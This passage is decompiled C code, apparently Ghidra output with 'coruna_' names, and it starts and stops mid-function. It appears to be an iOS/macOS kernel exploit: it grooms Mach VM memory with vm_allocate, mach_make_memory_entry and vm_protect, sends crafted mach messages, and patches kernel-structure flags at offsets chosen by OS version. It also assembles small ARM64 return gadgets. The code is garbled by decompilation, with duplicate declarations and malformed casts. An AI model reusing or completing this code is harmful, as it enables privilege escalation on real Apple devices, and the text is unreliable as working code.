            ptr[1] = u - 0x10;
            ptr[3] = lv7;
            size = _vm_region_64(*(vm_map_t *)k_kernel_mach_task_self_slot,&block_ctx,&action,9,
                                  host_info,&thread_attr,&bootargs);
            ptr[1] = addr;
            ptr[3] = handle;
            *(long *)(off + 8) = scratch;
            *(long *)(&k_kernel_slot_3468 + base) = *(long *)(&k_kernel_slot_3468 + base) + 1;
            if (size != 0) {
fail:
              size = size | 0x80000000;
              if (*(long *)k_kernel_stack_chk_guard_slot == sa_new) {
              return;
              }
              ___stack_chk_fail(size);
            }
            if (0xf < tag) {
              ls8 = 0x10;
            }
            sa_saved = action + block_ctx;
            stack_guard = block_ctx;
          }
          _memcpy((void *)(off_3 + port),&stack_guard,ls8);
          port = ls8 + port;
          if (size <= port) break;
          tag = tag - ls8;
          scratch = *(long *)(off + 8);
          handle = *(long *)k_kernel_vm_page_size_slot;
        } while( true );
      }
      size = 0;
    }
  }
done:
  if (*(long *)k_kernel_stack_chk_guard_slot == sa_new) {
    return;
  }
  ___stack_chk_fail(size);
}
void coruna_mach_make_memory_entry_11e48(long handle,long *addr_2)
{
  unsigned long u;
  uint size;
  kern_return_t lk3;
  uint version;
  uint port;
  unsigned long tag;
  long handle;
  unsigned long kind;
  unsigned long type_id;
  unsigned long type_id_8;
  long addr;
  vm_size_t lv12;
  long off;
  uint16_t type_id_9;
  uint64_t type_id_10;
  mem_entry_name_port_t scratch;
  vm_size_t bootargs;
  vm_address_t thread_attr;
  long host_info;
  
  lv12 = *(vm_size_t *)k_kernel_vm_page_size_slot;
  size = *(uint *)k_kernel_vm_page_shift_slot;
  host_info = 0;
  _arc4random_buf(&host_info,8);
  tag = *(unsigned long *)(handle + 8);
  u = 0x80000;
  if (tag >> 0x20 == 0) {
    u = 0x40000;
  }
  type_id = 0x100000;
  if (tag >> 0x21 == 0) {
    type_id = u;
  }
  u = 0x200000;
  if (tag >> 0x22 == 0) {
    u = type_id;
  }
  thread_attr = *(vm_address_t *)(&k_kernel_slot_3488 + handle);
  if ((thread_attr != 0) && (off = *(long *)(&k_kernel_slot_3490 + handle), off != 0)) {
    _madvise((thread_attr - lv12) + off,lv12,3);
    lk3 = _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,&thread_attr,off - lv12,
                         -0x35ffc000);
    if (lk3 == 0) {
      tag = 0;
      version = 0xad011;
      do {
        if (((tag != 0) && ((tag & 0x7f) == 0)) &&
           (lk3 = _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,&thread_attr,
                                 off - lv12,-0x35ffc000), lk3 != 0)) {
          return;
        }
        handle = lv12 * ((uint)tag & 0x7f);
        *(unsigned long *)(thread_attr + handle) = host_info + tag;
        DataSynchronizationBarrier(2,3,0);
        port = *(uint *)(addr_2 + 4);
        if (port != 0) {
          type_id = 0;
          kind = addr_2[3];
          do {
            type_id_8 = 1L << (type_id & 0x3f);
            if ((kind & type_id_8) == 0) {
              addr = *(long *)(*addr_2 + (unsigned long)(uint)((int)type_id << (unsigned long)(size & 0x1f)));
              if (addr == host_info + tag) {
                scratch = 0;
                addr_2[3] = kind | type_id_8;
                bootargs = lv12;
                version = _mach_make_memory_entry
                                  (*(vm_map_t *)k_kernel_mach_task_self_slot,&bootargs,
                                   thread_attr + handle,0x200003,&scratch,0);
                if (version == 0) {
                  version = 0;
                  *(mem_entry_name_port_t *)(addr_2 + 5) = scratch;
                }
                else {
                  version = version | 0x80000000;
                }
                port = *(uint *)(addr_2 + 4);
                break;
              }
              if (addr != *(long *)(&k_kernel_slot_3518 + handle)) {
                kind = kind | type_id_8;
                addr_2[3] = kind;
              }
            }
            type_id = type_id + 1;
          } while (port != type_id);
        }
        handle = addr_2[3];
        type_id_10 = coruna_cat(POPCOUNT((char)((unsigned long)handle >> 0x38)),
                          coruna_cat(POPCOUNT((char)((unsigned long)handle >> 0x30)),
                                   coruna_cat(POPCOUNT((char)((unsigned long)handle >> 0x28)),
                                            coruna_u64_pack14((POPCOUNT((char)((unsigned long)handle >> 0x20))), (coruna_cat(POPCOUNT((char))((unsigned long)handle >> 0x18))
                                                              ,coruna_cat(POPCOUNT((char)((unsigned long)handle
                                                                                       >> 0x10)),
                                                                        coruna_cat(POPCOUNT((char)((
                                                  unsigned long)handle >> 8)),POPCOUNT((char)handle))))))));
        type_id_9 = NEON_uaddlv(type_id_10,1);
        tag = tag + 1;
      } while ((port != (uint)coruna_cat((int6)((unsigned long)type_id_10 >> 0x10),type_id_9) && version != 0) &&
               tag != u);
    }
  }
  return;
}
void coruna_vm_protect(int *flags,long *handle)
{
  vm_address_t address;
  uint u;
  uint8_t *ptr;
  kern_return_t lk3;
  unsigned long size;
  uint version;
  vm_size_t size;
  unsigned long port;
  unsigned long tag;
  uint16_t kind;
  uint64_t type_id;
  
  ptr = k_kernel_mach_task_self_slot;
  version = *(uint *)(handle + 4);
  size = handle[3];
  type_id = coruna_cat(POPCOUNT((char)(size >> 0x38)),
                   coruna_cat(POPCOUNT((char)(size >> 0x30)),
                            coruna_cat(POPCOUNT((char)(size >> 0x28)),
                                     coruna_u64_pack14((POPCOUNT((char)(size >> 0x20))), (coruna_cat(POPCOUNT((char))(size >> 0x18)),
                                                       coruna_cat(POPCOUNT((char)(size >> 0x10)),
                                                                coruna_cat(POPCOUNT((char)(size >> 8)
                                                                                 ),
                                                                         POPCOUNT((char)size)))))))
                  );
  kind = NEON_uaddlv(type_id,1);
  if (version != (uint)coruna_cat((int6)((unsigned long)type_id >> 0x10),kind)) {
    size = *(vm_size_t *)k_kernel_vm_page_size_slot;
    u = *(uint *)k_kernel_vm_page_shift_slot;
    if (((*flags != 3) || (1 < *(int *)((long)handle + 0x24) + 1U)) && (version != 0)) {
      port = 0;
      do {
        tag = 1L << (port & 0x3f);
        if ((size & tag) == 0) {
          address = *handle + (unsigned long)(uint)((int)port << (unsigned long)(u & 0x1f));
          lk3 = _vm_protect(*(vm_map_t *)ptr,address,size,0,0);
          if (lk3 != 0) {
            return;
          }
          lk3 = _vm_protect(*(vm_map_t *)ptr,address,size,0,3);
          if (lk3 != 0) {
            return;
          }
          size = handle[3] | tag;
          handle[3] = size;
          version = *(uint *)(handle + 4);
        }
        port = port + 1;
      } while (port < version);
    }
  }
  return;
}
void coruna_vm_deallocate_121d4(long handle)
{
  uint8_t *ptr;
  kern_return_t lk2;
  int err;
  vm_size_t size;
  vm_inherit_t in_stack_ffffffffffffffc0;
  vm_address_t scratch;
  
  ptr = k_kernel_mach_task_self_slot;
  if (1 < *(mem_entry_name_port_t *)(&k_kernel_slot_34f0 + handle) + 1) {
    scratch = 0;
    size = *(vm_size_t *)k_kernel_vm_page_size_slot;
    lk2 = _vm_map(*(vm_map_t *)k_kernel_mach_task_self_slot,&scratch,size,0,1,
                    *(mem_entry_name_port_t *)(&k_kernel_slot_34f0 + handle),0,0,3,2,
                    in_stack_ffffffffffffffc0);
    if (lk2 == 0) {
      err = _madvise(scratch,size,3);
      if (err != 0) {
        ___error();
      }
      _vm_deallocate(*(vm_map_t *)ptr,scratch,size);
    }
  }
  return;
}
void coruna_kernel509_residual_292(long handle,long addr_2,uint64_t val,uint64_t *id_2)
{
  long handle;
  uint *ptr;
  long addr;
  uint u;
  uint size;
  uint version;
  uint port;
  unsigned long tag;
  uint kind;
  
  tag = *(unsigned long *)(handle + 0x158);
  if (tag < 0x27120080d00000) {
    if (tag < 0x225c23801af00e) {
      ptr = (uint *)(addr_2 + 0x74);
      u = *ptr;
      addr = 0x50;
    }
    else {
      handle = 0x7c;
      if (0x2711 < *(int *)(handle + 0x140)) {
        handle = 0x74;
      }
      addr = 0x58;
      if (0x2711 < *(int *)(handle + 0x140)) {
        addr = 0x50;
      }
      ptr = (uint *)(addr_2 + handle);
      u = *ptr;
      if (0x2712000c6fffff < tag) {
        kind = 0x800;
        port = 0x1000000;
        version = 0x80;
        size = 0x4000;
        if (((kind | size) & (u ^ 0xffffffff)) != 0) {
        return;
        }
        *ptr = version | u | port;
        if (id_2 != (uint64_t *)0x0) {
        *id_2 = *(uint64_t *)(addr_2 + addr);
        }
        *(uint64_t *)(addr_2 + addr) = val;
        return;
      }
    }
    size = 0x4000;
    if (tag < 0x27120007400000) {
      size = 0x80000;
    }
    version = 0x80;
    if (tag < 0x27120007400000) {
      version = 0x1000;
    }
    port = 0x1000000;
    if (tag < 0x27120007400000) {
      port = 0x20000000;
    }
    kind = 0x800;
    if (tag < 0x27120007400000) {
      kind = 0x10000;
    }
  }
  else {
    ptr = (uint *)(addr_2 + 0x7c);
    u = *ptr;
    kind = 0x800;
    port = 0x1000000;
    version = 0x80;
    size = 0x4000;
    addr = 0x58;
  }
fail:
  if (((kind | size) & (u ^ 0xffffffff)) != 0) {
    return;
  }
  *ptr = version | u | port;
  if (id_2 != (uint64_t *)0x0) {
    *id_2 = *(uint64_t *)(addr_2 + addr);
  }
  *(uint64_t *)(addr_2 + addr) = val;
  return;
}
void coruna_kernel509_residual_293(long handle,long addr_2,long off_3,int flags,uint64_t *val,
                 uint64_t id_2,unsigned long arg)
{
  long handle;
  uint u;
  unsigned long size;
  uint scratch;
  
  handle = coruna_kernel509_via_fn_ptr_cast_10_25(handle,0,&scratch);
  if (handle != 0) {
    val[3] = 0;
    val[2] = 0;
    val[5] = 0;
    val[4] = 0;
    val[6] = 0;
    val[1] = 0;
    *val = 0;
    size = 0;
    if (*(unsigned long *)k_kernel_vm_page_size_slot != 0) {
      size = arg / *(unsigned long *)k_kernel_vm_page_size_slot;
    }
    val[3] = 0;
    val[6] = size;
    *(uint32_t *)((long)val + 0x2c) = 0x140;
    *(int *)(val + 4) = (int)((unsigned long)(off_3 - handle) >> ((unsigned long)scratch & 0x3f));
    *(uint32_t *)((long)val + 0x24) = 0x2000000;
    *(uint64_t *)(addr_2 + 0x20) = id_2;
    if (flags != 0) {
      size = *(unsigned long *)(handle + 0x158);
      if (size < 0x27120080d00000) {
        if (size < 0x225c23801af00e) {
          handle = 0x74;
        }
        else {
          handle = 0x7c;
          if (0x2711 < *(int *)(handle + 0x140)) {
            handle = 0x74;
          }
        }
      }
      else {
        handle = 0x7c;
      }
      u = 0x4800;
      if (size < 0x27120007400000) {
        u = 0x90000;
      }
      if ((u & (*(uint *)(addr_2 + handle) ^ 0xffffffff)) == 0) {
        u = 0x80;
        if (size < 0x27120007400000) {
          u = 0x1000;
        }
        *(uint *)(addr_2 + handle) = *(uint *)(addr_2 + handle) | u;
      }
    }
  }
  return;
}
void coruna_cfdictionarysetvalue(uint64_t val,uint64_t id_2)
{
  uint64_t u;
  uint32_t scratch;
  
  scratch = 0x20;
  u = _CFNumberCreate(0,9,&scratch);
  _CFDictionarySetValue(val,id_2,u);
  _CFRelease(u);
  return;
}
void coruna_vm_deallocate_12660(long handle,long addr_2,unsigned long arg)
{
  short *lps1;
  long handle;
  char err;
  bool err;
  int err;
  unsigned long u;
  vm_address_t lv7;
  vm_size_t size;
  vm_inherit_t in_stack_ffffffffffffff80;
  uint32_t scratch;
  unsigned long scratch;
  vm_address_t bootargs [7];
  vm_address_t thread_attr;
  
  err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,(arg - *(long *)(&k_kernel_slot_3500 + addr_2) >>
                                ((unsigned long)*(uint *)k_kernel_vm_page_shift_slot & 0x3f) & 0xffffffff) *
                               8 + *(long *)(&k_kernel_slot_3508 + addr_2),8,&scratch);
  if ((err != 0) && ((~(uint)scratch & 3) == 0)) {
    err = coruna_fn_ptr_cast_10(handle,0x8000);
    handle = 8;
    if (err != 0) {
      handle = 0x20;
    }
    err = coruna_kernel509_residual_307(handle,(scratch & 0xfffffffffffc) + handle + -0xffffffffffe8,
                         &ghidra_stack_2);
    if ((err != 0) &&
       (u = coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_11(handle,coruna_u64_pack((scratch), (in_stack_ffffffffffffff80)) +
                                     (arg >> 10 & 0xc)), u != 0)) {
      thread_attr = 0;
      size = *(vm_size_t *)k_kernel_vm_page_size_slot;
      if (*(mem_entry_name_port_t *)(handle + 0x58) + 1 < 2) {
        err = coruna_mach_make_memory_entry_2aed0(handle,u,bootargs);
      }
      else {
        err = _vm_map(*(vm_map_t *)k_kernel_mach_task_self_slot,&thread_attr,size,0,1,
                        *(mem_entry_name_port_t *)(handle + 0x58),
                        u & (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff),0,3,2,
                        in_stack_ffffffffffffff80);
      }
      if (err == 0) {
        err = *(int *)(handle + 0x58);
        lv7 = thread_attr;
        if (err + 1U < 2) {
          lv7 = bootargs[0];
        }
        lps1 = (short *)((*(unsigned long *)(handle + 0x188) & u) + lv7);
        if (*lps1 != 0) {
          do {
            err = '\x01';
            err = (bool)coruna_ldrex_pass(lps1,0x10);
            if (err) {
              *lps1 = *lps1 + -1;
              err = coruna_ldrexp_clear();
            }
          } while (err != '\0');
          lps1[1] = 0x4000;
          err = *(int *)(handle + 0x58);
        }
        if (err + 1U < 2) {
          coruna_mach_port_deallocate_2b24c(handle,bootargs);
        }
        else {
          _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,thread_attr,size);
        }
      }
    }
  }
  return;
}
void coruna_kernel509_via_fn_ptr_cast_2(long handle,long addr_2,uint64_t *val)
{
  int err;
  long handle;
  uint64_t scratch;
  
  err = *(int *)(handle + 0x140);
  if (err < 0x2258) {
    if (1 < err - 0x1f53U) {
      if (err != 0x1c1b) {
        return;
      }
      handle = 0xf8;
      err = coruna_kernel509_residual_307(handle,handle + addr_2,&scratch);
      if ((err != 0) &&
      (((0x1f52ffffffffff < *(unsigned long *)(handle + 0x158) ||
      (err = coruna_kernel509_residual_307(handle,scratch,&scratch), err != 0)) &&
      (handle = coruna_fn_ptr_cast_2(handle,scratch), handle != 0)))) {
      *val = scratch;
      }
      return;
    }
  }
  else if (err != 0x225c && err != 0x2258) {
    return;
  }
  handle = 0xf8;
  if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
    handle = 0x100;
  }
fail:
  err = coruna_kernel509_residual_307(handle,handle + addr_2,&scratch);
  if ((err != 0) &&
     (((0x1f52ffffffffff < *(unsigned long *)(handle + 0x158) ||
       (err = coruna_kernel509_residual_307(handle,scratch,&scratch), err != 0)) &&
      (handle = coruna_fn_ptr_cast_2(handle,scratch), handle != 0)))) {
    *val = scratch;
  }
  return;
}
void coruna_kernel509_via_fn_ptr_cast_2_2(uint64_t val,uint64_t id_2,unsigned long arg,uint64_t *size_3)
{
  int err;
  long handle;
  long scratch;
  long bootargs;
  long thread_attr;
  
  *size_3 = 0;
  scratch = 0;
  err = coruna_kernel509_via_fn_ptr_cast_2(val,id_2,&thread_attr);
  if ((((err == 0) &&
       (err = coruna_kernel509_residual_307(val,thread_attr + (arg & 0xffffffff) * 8,&bootargs), err != 0))
      && (handle = coruna_fn_ptr_cast_2(val,bootargs), handle != 0)) &&
     (err = coruna_kernel509_residual_307(val,bootargs + 0x10,&scratch), err != 0)) {
    coruna_fn_ptr_cast_2(val,scratch);
    coruna_kernel509_residual_307(val,scratch + 0x38,size_3);
  }
  return;
}
void coruna_call_call_mach_vm_machine_attribute_1d4f8_2b614(long handle)
{
  coruna_call_mach_vm_machine_attribute_1d4f8_2b614(*(uint64_t *)(handle + 0x20));
  return;
}
void coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub(long handle,uint64_t val,uint64_t id_2,uint64_t size_3)
{
  coruna_call_mach_vm_machine_attribute_1d4f8_2667c(*(uint64_t *)(handle + 0x20),val,size_3,id_2);
  return;
}
void coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub_2(long handle,uint64_t val)
{
  uint8_t scratch[8];
  
  coruna_call_mach_vm_machine_attribute_1d4f8_2667c(*(uint64_t *)(handle + 0x20),val,8,scratch);
  return;
}
void coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b614(long handle,uint64_t val,uint64_t id_2)
{
  uint64_t scratch;
  
  scratch = id_2;
  coruna_call_mach_vm_machine_attribute_1d4f8_2b614(*(uint64_t *)(handle + 0x20),val,&scratch,8);
  return;
}
void coruna_kernel509_residual_294(long handle,uint64_t val)
{
  uint8_t scratch[4];
  
  coruna_kernel509_via_mach_vm_read_overwrite(*(uint64_t *)(handle + 0x20),val,scratch);
  return;
}
void coruna_call_mach_vm_machine_attribute(long handle)
{
  coruna_mach_vm_machine_attribute(*(uint64_t *)(handle + 0x20));
  return;
}
void coruna_kernel509_via_u64_pack(long *handle,uint64_t val)
{
  long handle;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t host_info;
  long serial_buf;
  
  serial_buf = *(long *)k_kernel_stack_chk_guard_slot;
  handle[1] = 0xb0;
  thread_attr = k_kernel_rodata_word_00043078;
  thread_attr = k_kernel_rodata_word_43070;
  host_info = coruna_u64_pack((host_info), (k_kernel_rodata_word_43080));
  scratch = k_kernel_rodata_word_0004308c;
  scratch = k_kernel_rodata_word_43084;
  bootargs = coruna_u64_pack((bootargs), (k_kernel_rodata_word_43094));
  handle = coruna_ret_stub_4(val,&thread_attr,&scratch,5);
  *handle = handle + 4;
  thread_attr = k_kernel_rodata_word_000430a0;
  thread_attr = k_kernel_rodata_word_43098;
  host_info = k_kernel_rodata_word_000430b0;
  host_info = k_kernel_rodata_word_430a8;
  scratch = 0xffffffffffffffff;
  scratch = 0xffffffffffffffff;
  bootargs = 0xffffffffffffffff;
  bootargs = 0xffffffffffffffff;
  handle = coruna_ret_stub_4(val,&thread_attr,&scratch,8);
  handle[2] = handle;
  handle[3] = handle + 0x14;
  handle[8] = handle + 0x1c;
  thread_attr = k_kernel_rodata_word_43010;
  thread_attr = 0xd65f03c0;
  scratch = 0xffffffffffffffff;
  scratch = 0xffffffff;
  handle = coruna_ret_stub_4(val,&thread_attr,&scratch,3);
  handle[4] = handle;
  thread_attr = k_kernel_rodata_word_43018;
  thread_attr = 0xd65f03c0;
  scratch = 0xffffffffffffffff;
  scratch = 0xffffffff;
  handle = coruna_ret_stub_4(val,&thread_attr,&scratch,3);
  handle[5] = handle;
  thread_attr = k_kernel_rodata_word_43020;
  thread_attr = coruna_u64_pack((thread_attr), (0x910002bf));
  scratch = 0xffffffffffffffff;
  scratch = coruna_u64_pack((scratch), (0xffffffff));
  handle = coruna_ret_stub_4(val,&thread_attr,&scratch,3);
  handle[6] = handle;
  thread_attr = k_kernel_rodata_word_000430c0;
  thread_attr = k_kernel_rodata_word_430b8;
  host_info = coruna_u64_pack((host_info), (k_kernel_rodata_word_430c8));
  scratch = k_kernel_rodata_word_000430d4;
  scratch = k_kernel_rodata_word_430cc;
  bootargs = coruna_u64_pack((bootargs), (k_kernel_rodata_word_430dc));
  handle = coruna_ret_stub_4(val,&thread_attr,&scratch,5);
  handle[7] = handle;
  if (*(long *)k_kernel_stack_chk_guard_slot == serial_buf) {
    return;
  }
  ___stack_chk_fail();
}
void coruna_mach_port_allocate_12eb0(long handle,int flags)
{
  uint8_t *ptr;
  mach_msg_header_t *lpm2;
  long handle;
  long addr;
  uint64_t u;
  uint64_t size;
  mach_port_name_t scratch;
  
  ptr = k_kernel_mach_task_self_slot;
  scratch = 0;
  _mach_port_allocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,1,&scratch);
  lpm2 = _calloc(1,(unsigned long)(flags + 0x18U));
  lpm2->msgh_size = flags + 0x18U;
  lpm2->msgh_remote_port = scratch;
  lpm2->msgh_bits = 0x15;
  _mach_msg_send(lpm2);
  handle = coruna_call_helper_25fa0_stub(*(uint64_t *)(handle + 8),scratch);
  addr = coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub_2(*(uint64_t *)(handle + 8),handle + 0x20);
  size = *(uint64_t *)(*(long *)(handle + 8) + 0x20);
  u = coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub_2(*(long *)(handle + 8),addr + 0x10);
  coruna_kernel509_via_fn_ptr_cast_10_10(size,u);
  coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b614(*(uint64_t *)(handle + 8),handle + 0x20,0,1);
  _mach_port_destroy(*(ipc_space_t *)ptr,scratch);
  return;
}
void coruna_mach_msg_send(long handle,uint64_t val,uint64_t id_2,unsigned long arg,
                 uint64_t size_3,uint64_t off_4,uint64_t off_5)
{
  long handle;
  long addr;
  
  addr = *(long *)(handle + 0x10);
  *(uint32_t *)(addr + 0x408) = *(uint32_t *)(addr + 8);
  *(uint32_t *)(addr + 0x40c) = 0;
  *(int *)(addr + 0x414) = *(int *)(addr + 0x14) + 100;
  _memcpy((void *)(addr + 0x42c),(void *)(addr + 0x38),0x210);
  *(uint64_t *)(addr + 0x418) = *(uint64_t *)k_kernel_ndr_record_slot;
  *(uint32_t *)(addr + 0x428) = 0x84;
  *(uint64_t *)(addr + 0x420) = k_kernel_rodata_word_43028;
  *(uint64_t *)(addr + 0x400) = k_kernel_rodata_word_43030;
  _memcpy(*(void **)(handle + 0x18),(void *)(handle + 0x2c),0x130);
  addr = *(long *)(handle + 0x10);
  handle = *(long *)(handle + 0x18);
  *(uint64_t *)(handle + 8) = val;
  *(uint64_t *)(handle + 0x10) = id_2;
  *(unsigned long *)(handle + 0x18) = arg & 0xffffffff;
  *(uint64_t *)(handle + 0x20) = size_3;
  *(uint64_t *)(handle + 0x28) = off_4;
  *(uint64_t *)(handle + 0x30) = off_5;
  _mach_msg_send((mach_msg_header_t *)(addr + 0x400));
  _bzero(*(void **)(handle + 0x10),0x800);
  _mach_msg(*(mach_msg_header_t **)(handle + 0x10),2,0,0x400,*(mach_port_name_t *)(handle + 0x170)
            ,0,0);
  return;
}
void coruna_kernel09_via_mach_msg_send(long handle,uint64_t val,uint64_t id_2,uint64_t size_3,
                 uint64_t off_4,long addr_2)
{
  uint64_t u;
  uint64_t size;
  long handle;
  long addr;
  
  handle = 0;
  addr = *(long *)(handle + 0x160);
  do {
    *(uint64_t *)(addr + 8 + handle) = *(uint64_t *)(addr_2 + handle);
    handle = handle + 8;
  } while (handle != 0xf0);
  *(uint64_t *)(addr + 0x100) = off_4;
  *(uint64_t *)(handle + 0xdc) = *(uint64_t *)(handle + 0x168);
  u = *(uint64_t *)(addr_2 + 0x80);
  size = *(uint64_t *)(addr_2 + 0x88);
  *(uint64_t *)(addr + 0x108) = val;
  *(int *)(addr + 0x110) = (int)id_2;
  *(uint64_t *)(addr + 0xf8) = size_3;
  *(uint64_t *)(addr + 0x88) = u;
  *(uint64_t *)(addr + 0x90) = size;
  coruna_mach_msg_send(handle,*(uint64_t *)(handle + 0x168),val,id_2,size_3,u);
  *(uint64_t *)(handle + 0xdc) = *(uint64_t *)(handle + 0x178);
  return;
}
void coruna_kernel509_via_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b614(long handle,uint64_t val,uint size,long addr_2)
{
  long handle;
  unsigned long u;
  long scratch [31];
  long bootargs;
  
  bootargs = *(long *)k_kernel_stack_chk_guard_slot;
  scratch[0x1b] = 0;
  scratch[0x1a] = 0;
  scratch[0x1d] = 0;
  scratch[0x1c] = 0;
  scratch[0x17] = 0;
  scratch[0x16] = 0;
  scratch[0x19] = 0;
  scratch[0x18] = 0;
  scratch[0x13] = 0;
  scratch[0x12] = 0;
  scratch[0x15] = 0;
  scratch[0x14] = 0;
  scratch[0xf] = 0;
  scratch[0xe] = 0;
  scratch[0x11] = 0;
  scratch[0x10] = 0;
  scratch[0xb] = 0;
  scratch[10] = 0;
  scratch[0xd] = 0;
  scratch[0xc] = 0;
  scratch[7] = 0;
  scratch[6] = 0;
  scratch[9] = 0;
  scratch[8] = 0;
  scratch[3] = 0;
  scratch[2] = 0;
  scratch[5] = 0;
  scratch[4] = 0;
  scratch[1] = 0;
  scratch[0] = 0;
  handle = *(long *)(handle + 0x278);
  if (0 < (int)size) {
    u = 0;
    do {
      if (((uint)u < 8) || ((uint)u == 0xf)) {
        scratch[u] = *(long *)(addr_2 + u * 8);
      }
      else {
        coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b614(*(uint64_t *)(handle + 8),handle,*(uint64_t *)(addr_2 + u * 8),1);
        handle = handle + 8;
      }
      u = u + 1;
    } while (size != u);
    handle = *(long *)(handle + 0x278);
  }
  scratch[0x13] = *(long *)(handle + 0x298) + 0xefe8;
  scratch[0x15] = *(uint64_t *)(handle + 0x178);
  scratch[0x17] = *(long *)(handle + 0x298) + 0xef80;
  coruna_kernel09_via_mach_msg_send(handle,val,*(uint32_t *)(handle + 0x294),k_kernel_rodata_word_48038,handle,scratch);
  coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub_2(*(uint64_t *)(handle + 8),*(long *)(handle + 0x298) + 0xf000);
  if (*(long *)k_kernel_stack_chk_guard_slot != bootargs) {
    ___stack_chk_fail();
  }
  return;
}





void coruna_kernel509_residual_295(long *handle,uint64_t val,uint64_t *id_2)
{
  long handle;
  uint64_t *scratch;
  uint64_t bootargs[30];
  
  handle = 0;
  bootargs[0x1d] = *(uint64_t *)k_kernel_stack_chk_guard_slot;
  bootargs[0x1c] = 0;
  bootargs[0x19] = 0;
  bootargs[0x18] = 0;
  bootargs[0x1b] = 0;
  bootargs[0x1a] = 0;
  bootargs[0x15] = 0;
  bootargs[0x14] = 0;
  bootargs[0x17] = 0;
  bootargs[0x16] = 0;
  bootargs[0x11] = 0;
  bootargs[0x10] = 0;
  bootargs[0x13] = 0;
  bootargs[0x12] = 0;
  bootargs[0xd] = 0;
  bootargs[0xc] = 0;
  bootargs[0xf] = 0;
  bootargs[0xe] = 0;
  bootargs[9] = 0;
  bootargs[8] = 0;
  bootargs[0xb] = 0;
  bootargs[10] = 0;
  bootargs[5] = 0;
  bootargs[4] = 0;
  bootargs[7] = 0;
  bootargs[6] = 0;
  bootargs[1] = 0;
  bootargs[0] = 0;
  bootargs[3] = 0;
  bootargs[2] = 0;
  scratch = id_2;
  do {
    *(uint64_t *)((long)bootargs + handle) = *scratch;
    handle = handle + 8;
    scratch = scratch + 1;
  } while (handle != 0xe8);
  coruna_kernel509_via_helper_5d2c_419fc_2(*(uint64_t *)(*handle + 8),handle,val,0x1d,bootargs);
}
void coruna_kernel509_via_kernel09_via_mach_msg_send(long handle,uint64_t val,uint64_t id_2)
{
  long scratch [17];
  uint64_t bootargs;
  uint64_t scratch;
  uint64_t thread_attr;
  uint64_t bootargs;
  uint64_t host_info;
  uint64_t thread_attr;
  uint64_t serial_buf;
  uint64_t host_info;
  uint64_t action;
  uint64_t serial_buf;
  uint64_t block_ctx;
  uint64_t action;
  uint64_t stack_guard;
  long sa_saved;
  
  sa_saved = *(long *)k_kernel_stack_chk_guard_slot;
  scratch[0xe] = 0;
  scratch[0xd] = 0;
  scratch[0xf] = 0;
  scratch = 0;
  action = 0;
  block_ctx = 0;
  serial_buf = 0;
  action = 0;
  host_info = 0;
  serial_buf = 0;
  thread_attr = 0;
  bootargs = 0;
  thread_attr = 0;
  scratch[10] = 0;
  scratch[9] = 0;
  scratch[0xc] = 0;
  scratch[0xb] = 0;
  scratch[6] = 0;
  scratch[5] = 0;
  scratch[8] = 0;
  scratch[7] = 0;
  scratch[2] = 0;
  scratch[1] = 0;
  scratch[4] = 0;
  scratch[3] = 0;
  scratch[0] = *(long *)(handle + 0x298) + 0xf000;
  host_info = *(uint64_t *)(handle + 0x178);
  stack_guard = 0;
  scratch[0x10] = val;
  bootargs = id_2;
  coruna_kernel09_via_mach_msg_send(handle,k_kernel_rodata_word_48020,*(uint32_t *)(handle + 0x290),
               *(uint64_t *)(handle + 0x270),*(uint64_t *)(handle + 0x278),scratch);
  coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub_2(*(uint64_t *)(handle + 8),*(long *)(handle + 0x298) + 0xf000);
  if (*(long *)k_kernel_stack_chk_guard_slot == sa_saved) {
    return;
  }
  ___stack_chk_fail();
}





void coruna_call_indirect_b0fc_134a8(long *handle,uint64_t val)
{
  coruna_kernel509_via_helper_5d2c_419fc_2(*(uint64_t *)(*handle + 0x10),handle,val,0);
}
void coruna_kernel509_via_kernel09_via_mach_msg_send_2(long handle,uint64_t val,uint64_t id_2)
{
  long scratch [17];
  uint64_t bootargs;
  uint64_t scratch;
  uint64_t thread_attr;
  uint64_t bootargs;
  uint64_t host_info;
  uint64_t thread_attr;
  uint64_t serial_buf;
  uint64_t host_info;
  uint64_t action;
  uint64_t serial_buf;
  uint64_t block_ctx;
  uint64_t action;
  uint64_t stack_guard;
  long sa_saved;
  
  sa_saved = *(long *)k_kernel_stack_chk_guard_slot;
  scratch[0xe] = 0;
  scratch[0xd] = 0;
  scratch[0xf] = 0;
  scratch = 0;
  action = 0;
  block_ctx = 0;
  serial_buf = 0;
  action = 0;
  host_info = 0;
  serial_buf = 0;
  thread_attr = 0;
  bootargs = 0;
  thread_attr = 0;
  scratch[10] = 0;
  scratch[9] = 0;
  scratch[0xc] = 0;
  scratch[0xb] = 0;
  scratch[6] = 0;
  scratch[5] = 0;
  scratch[8] = 0;
  scratch[7] = 0;
  scratch[2] = 0;
  scratch[1] = 0;
  scratch[4] = 0;
  scratch[3] = 0;
  scratch[0] = *(long *)(handle + 0x298) + 0xf100;
  host_info = *(uint64_t *)(handle + 0x178);
  stack_guard = 0;
  scratch[0x10] = val;
  bootargs = id_2;
  coruna_kernel09_via_mach_msg_send(handle,k_kernel_rodata_word_48028,*(uint32_t *)(handle + 0x290),
               *(uint64_t *)(handle + 0x270),*(uint64_t *)(handle + 0x278),scratch);
  coruna_call_mach_vm_machine_attribute_1d4f8_2667c_stub_2(*(uint64_t *)(handle + 8),*(long *)(handle + 0x298) + 0xf100);
  if (*(long *)k_kernel_stack_chk_guard_slot == sa_saved) {
    return;
  }
